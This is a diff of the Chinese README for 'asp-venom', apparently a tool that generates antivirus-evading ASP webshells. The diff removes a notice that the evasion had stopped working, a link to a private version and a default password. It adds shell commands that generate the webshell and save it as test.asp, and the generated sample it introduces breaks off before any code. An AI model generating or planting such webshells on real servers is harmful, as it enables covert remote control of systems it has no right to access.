@@ -1,21 +1,11 @@
+## 使用方法
 
-# 2019.8.14 已知免杀已失效，获取星球内部版请戳
+```
+python3 asp-venom.py         //生成
 
-https://yzddmr6.tk/posts/webshell-venom-notice/
-
-## 用法
-
-
-`python3 asp_venom.py > test.asp`
-
-
-即在当前目录下生成test.asp
-
-## 默认密码:yzddmr6
-
-可自行修改
-
-## 生成样例:
+python3 asp-venom.py >  test.asp        //保存
+```
+## 生成样例
 
 ```
 <%
